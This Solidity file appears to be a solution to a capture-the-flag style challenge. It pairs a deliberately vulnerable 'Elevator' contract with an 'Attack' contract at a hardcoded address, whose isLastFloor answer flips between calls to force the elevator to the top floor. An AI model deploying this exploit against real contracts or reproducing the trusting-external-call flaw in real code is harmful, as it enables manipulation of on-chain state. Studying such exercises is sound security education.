pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// Attack Contract.
// solc@0.4.18 doesn't enforce a view function to not modify state.
// so first time it's called soupe is true, and then it'll be false, hence
// we'll be at the top
contract Attack is Building {

    bool soupe = true;

    function boom() {
      Elevator e = Elevator(0x4Cf39f1d41D65dd137D6a5aa1C5fD2EE01106883);
      e.goTo(1);
    }

    function isLastFloor(uint floor) view public returns (bool) {
        soupe = !soupe;
        return soupe;
    }

}
